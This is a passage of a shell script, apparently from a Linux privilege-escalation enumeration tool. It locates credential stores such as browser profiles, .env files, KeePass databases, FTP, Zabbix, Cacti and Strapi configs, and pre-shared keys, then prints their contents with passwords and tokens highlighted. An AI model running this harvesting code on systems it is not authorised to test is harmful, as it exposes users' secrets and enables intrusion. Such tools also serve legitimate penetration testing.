    if ! [ "`echo \"$PSTORAGE_FIREFOX\" | grep -E \"\.mozilla$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".mozilla"; fi; fi; printf "%s" "$PSTORAGE_FIREFOX" | grep -E "\.mozilla$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.mozilla$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FIREFOX\" | grep -E \"Firefox$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Firefox"; fi; fi; printf "%s" "$PSTORAGE_FIREFOX" | grep -E "Firefox$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Firefox$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_CHROME" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Chrome Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CHROME\" | grep -E \"google-chrome$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "google-chrome"; fi; fi; printf "%s" "$PSTORAGE_CHROME" | grep -E "google-chrome$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,google-chrome$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CHROME\" | grep -E \"Chrome$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Chrome"; fi; fi; printf "%s" "$PSTORAGE_CHROME" | grep -E "Chrome$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Chrome$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_AUTOLOGIN" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Autologin Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_AUTOLOGIN\" | grep -E \"autologin$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "autologin"; fi; fi; printf "%s" "$PSTORAGE_AUTOLOGIN" | grep -E "autologin$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,autologin$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,passwd,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_AUTOLOGIN\" | grep -E \"autologin\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "autologin.conf"; fi; fi; printf "%s" "$PSTORAGE_AUTOLOGIN" | grep -E "autologin\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,autologin\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,passwd,${SED_RED},g"; done; echo "";
fi

if (grep auth= /etc/login.conf 2>/dev/null | grep -v "^#" | grep -q skey) || [ "$DEBUG" ] ; then
  print_2title "S/Key authentication"
  printf "System supports$RED S/Key$NC authentication\n"
  if ! [ -d /etc/skey/ ]; then
    echo "${GREEN}S/Key authentication enabled, but has not been initialized"
  elif ! [ "$IAMROOT" ] && [ -w /etc/skey/ ]; then
    echo "${RED}/etc/skey/ is writable by you"
    ls -ld /etc/skey/
  else
    ls -ld /etc/skey/ 2>/dev/null
  fi
fi
echo ""

if (grep "auth=" /etc/login.conf 2>/dev/null | grep -v "^#" | grep -q yubikey) || [ "$DEBUG" ]; then
  print_2title "YubiKey authentication"
  printf "System supports$RED YubiKey$NC authentication\n"
  if ! [ "$IAMROOT" ] && [ -w /var/db/yubikey/ ]; then
    echo "${RED}/var/db/yubikey/ is writable by you"
    ls -ld /var/db/yubikey/
  else
    ls -ld /var/db/yubikey/ 2>/dev/null
  fi
  echo ""
fi

if [ "$PSTORAGE_SNMP" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing SNMP Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SNMP\" | grep -E \"snmpd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "snmpd.conf"; fi; fi; printf "%s" "$PSTORAGE_SNMP" | grep -E "snmpd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,snmpd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "rocommunity|rwcommunity|extend.*" | sed -${E} "s,rocommunity|rwcommunity|extend.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_PYPIRC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Pypirc Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PYPIRC\" | grep -E \"\.pypirc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".pypirc"; fi; fi; printf "%s" "$PSTORAGE_PYPIRC" | grep -E "\.pypirc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.pypirc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username|password,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_POSTFIX" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Postfix Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_POSTFIX\" | grep -E \"postfix$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "postfix"; fi; fi; printf "%s" "$PSTORAGE_POSTFIX" | grep -E "postfix$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,postfix$,${SED_RED},"; find "$f" -name "master.cf" | while read ff; do ls -ld "$ff" | sed -${E} "s,master.cf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "user=" | sed -${E} "s,user=|argv=,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_LDAPRC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Ldaprc Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_LDAPRC\" | grep -E \"\.ldaprc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".ldaprc"; fi; fi; printf "%s" "$PSTORAGE_LDAPRC" | grep -E "\.ldaprc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.ldaprc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_ENV" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Env Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ENV\" | grep -E \"\.env$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".env"; fi; fi; printf "%s" "$PSTORAGE_ENV" | grep -E "\.env$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.env$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[tT][oO][kK][eE][N]|[dD][bB],${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_MSMTPRC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Msmtprc Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_MSMTPRC\" | grep -E \"\.msmtprc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".msmtprc"; fi; fi; printf "%s" "$PSTORAGE_MSMTPRC" | grep -E "\.msmtprc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.msmtprc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,user.*|password.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_KEEPASS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Keepass Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"\.kdbx$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.kdbx"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "\.kdbx$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.kdbx$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"KeePass\.config.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "KeePass.config*"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "KeePass\.config.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,KeePass\.config.*$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"KeePass\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "KeePass.ini"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "KeePass\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,KeePass\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"KeePass\.enforced.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "KeePass.enforced*"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "KeePass\.enforced.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,KeePass\.enforced.*$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_FTP" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing FTP Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"\.ftpconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.ftpconfig"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "\.ftpconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.ftpconfig$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ffftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ffftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ffftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ffftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ftp\.config$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ftp.config"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ftp\.config$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ftp\.config$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"sites\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sites.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "sites\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sites\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"wcx_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wcx_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "wcx_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wcx_ftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"winscp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "winscp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "winscp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,winscp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ws_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ws_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ws_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ws_ftp\.ini$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_ROCKETCHAT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Rocketchat Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ROCKETCHAT\" | grep -E \"rocketchat\.service$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rocketchat.service"; fi; fi; printf "%s" "$PSTORAGE_ROCKETCHAT" | grep -E "rocketchat\.service$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rocketchat\.service$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E -i "Environment" | sed -${E} "s,mongodb://.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_GLUSTERFS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing GlusterFS Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_GLUSTERFS\" | grep -E \"glusterfs\.pem$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "glusterfs.pem"; fi; fi; printf "%s" "$PSTORAGE_GLUSTERFS" | grep -E "glusterfs\.pem$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,glusterfs\.pem$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GLUSTERFS\" | grep -E \"glusterfs\.ca$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "glusterfs.ca"; fi; fi; printf "%s" "$PSTORAGE_GLUSTERFS" | grep -E "glusterfs\.ca$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,glusterfs\.ca$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GLUSTERFS\" | grep -E \"glusterfs\.key$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "glusterfs.key"; fi; fi; printf "%s" "$PSTORAGE_GLUSTERFS" | grep -E "glusterfs\.key$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,glusterfs\.key$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_RACOON" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Racoon Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_RACOON\" | grep -E \"racoon\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "racoon.conf"; fi; fi; printf "%s" "$PSTORAGE_RACOON" | grep -E "racoon\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,racoon\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,pre_shared_key.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_RACOON\" | grep -E \"psk\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "psk.txt"; fi; fi; printf "%s" "$PSTORAGE_RACOON" | grep -E "psk\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,psk\.txt$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_OPERA" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Opera Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_OPERA\" | grep -E \"com\.operasoftware\.Opera$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "com.operasoftware.Opera"; fi; fi; printf "%s" "$PSTORAGE_OPERA" | grep -E "com\.operasoftware\.Opera$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,com\.operasoftware\.Opera$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_SAFARI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Safari Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SAFARI\" | grep -E \"Safari$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Safari"; fi; fi; printf "%s" "$PSTORAGE_SAFARI" | grep -E "Safari$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Safari$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_INFLUXDB" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing InfluxDB Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_INFLUXDB\" | grep -E \"influxdb\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "influxdb.conf"; fi; fi; printf "%s" "$PSTORAGE_INFLUXDB" | grep -E "influxdb\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,influxdb\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,auth-enabled.*=.*false|token|https-private-key,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_ZABBIX" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Zabbix Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ZABBIX\" | grep -E \"zabbix_server\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "zabbix_server.conf"; fi; fi; printf "%s" "$PSTORAGE_ZABBIX" | grep -E "zabbix_server\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,zabbix_server\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,DBName|DBUser|DBPassword,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_ZABBIX\" | grep -E \"zabbix_agentd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "zabbix_agentd.conf"; fi; fi; printf "%s" "$PSTORAGE_ZABBIX" | grep -E "zabbix_agentd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,zabbix_agentd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,TLSPSKFile|psk,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_ZABBIX\" | grep -E \"zabbix$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "zabbix"; fi; fi; printf "%s" "$PSTORAGE_ZABBIX" | grep -E "zabbix$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,zabbix$,${SED_RED},"; find "$f" -name "*.psk" | while read ff; do ls -ld "$ff" | sed -${E} "s,.psk,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_PRE_SHARED_KEYS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Pre-Shared Keys Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PRE_SHARED_KEYS\" | grep -E \"\.psk$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.psk"; fi; fi; printf "%s" "$PSTORAGE_PRE_SHARED_KEYS" | grep -E "\.psk$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.psk$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_PASS_STORE_DIRECTORIES" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Pass Store Directories Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PASS_STORE_DIRECTORIES\" | grep -E \"\.password-store$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".password-store"; fi; fi; printf "%s" "$PSTORAGE_PASS_STORE_DIRECTORIES" | grep -E "\.password-store$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.password-store$,${SED_RED},"; ls -lRA "$f";done; echo "";
fi


if [ "$PSTORAGE_BIND" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Bind Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_BIND\" | grep -E \"bind$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bind"; fi; fi; printf "%s" "$PSTORAGE_BIND" | grep -E "bind$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bind$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; done; echo "";find "$f" -name "*.key" | while read ff; do ls -ld "$ff" | sed -${E} "s,.key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_SEEDDMS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing SeedDMS Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SEEDDMS\" | grep -E \"seeddms.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "seeddms*"; fi; fi; printf "%s" "$PSTORAGE_SEEDDMS" | grep -E "seeddms.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,seeddms.*$,${SED_RED},"; find "$f" -name "settings.xml" | while read ff; do ls -ld "$ff" | sed -${E} "s,settings.xml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "=" | sed -${E} "s,[pP][aA][sS][sS],${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_DDCLIENT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Ddclient Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_DDCLIENT\" | grep -E \"ddclient\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ddclient.conf"; fi; fi; printf "%s" "$PSTORAGE_DDCLIENT" | grep -E "ddclient\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ddclient\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*password.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_SENTRY" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Sentry Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SENTRY\" | grep -E \"sentry$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sentry"; fi; fi; printf "%s" "$PSTORAGE_SENTRY" | grep -E "sentry$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sentry$,${SED_RED},"; find "$f" -name "config.yml" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.yml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,*key*,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_SENTRY\" | grep -E \"sentry\.conf\.py$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sentry.conf.py"; fi; fi; printf "%s" "$PSTORAGE_SENTRY" | grep -E "sentry\.conf\.py$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sentry\.conf\.py$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[uU][sS][eE][rR].*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_STRAPI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Strapi Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_STRAPI\" | grep -E \"environments$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "environments"; fi; fi; printf "%s" "$PSTORAGE_STRAPI" | grep -E "environments$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,environments$,${SED_RED},"; find "$f" -name "custom.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,custom.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "database.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,database.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "request.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,request.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "response.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,response.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "security.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,security.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "server.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,server.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_CACTI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cacti Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CACTI\" | grep -E \"cacti$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "cacti"; fi; fi; printf "%s" "$PSTORAGE_CACTI" | grep -E "cacti$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,cacti$,${SED_RED},"; find "$f" -name "config.php" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.php,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";find "$f" -name "config.php.dist" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.php.dist,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";find "$f" -name "installer.php" | while read ff; do ls -ld "$ff" | sed -${E} "s,installer.php,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";find "$f" -name "check_all_pages" | while read ff; do ls -ld "$ff" | sed -${E} "s,check_all_pages,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_ROUNDCUBE" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Roundcube Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ROUNDCUBE\" | grep -E \"roundcube$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "roundcube"; fi; fi; printf "%s" "$PSTORAGE_ROUNDCUBE" | grep -E "roundcube$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,roundcube$,${SED_RED},"; find "$f" -name "config.inc.php" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.inc.php,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "config\[" | sed -${E} "s,db_dsnw,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_PASSBOLT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Passbolt Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PASSBOLT\" | grep -E \"passbolt\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "passbolt.php"; fi; fi; printf "%s" "$PSTORAGE_PASSBOLT" | grep -E "passbolt\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,passbolt\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "host|port|username|password|database" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[uU][sS][eE][rR].*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_JETTY" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Jetty Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_JETTY\" | grep -E \"jetty-realm\.properties$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "jetty-realm.properties"; fi; fi; printf "%s" "$PSTORAGE_JETTY" | grep -E "jetty-realm\.properties$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,jetty-realm\.properties$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi




if [ "$PSTORAGE_INTERESTING_LOGS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Interesting logs Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_INTERESTING_LOGS\" | grep -E \"access\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "access.log"; fi; fi; printf "%s" "$PSTORAGE_INTERESTING_LOGS" | grep -E "access\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,access\.log$,${SED_RED},"; done; echo "";
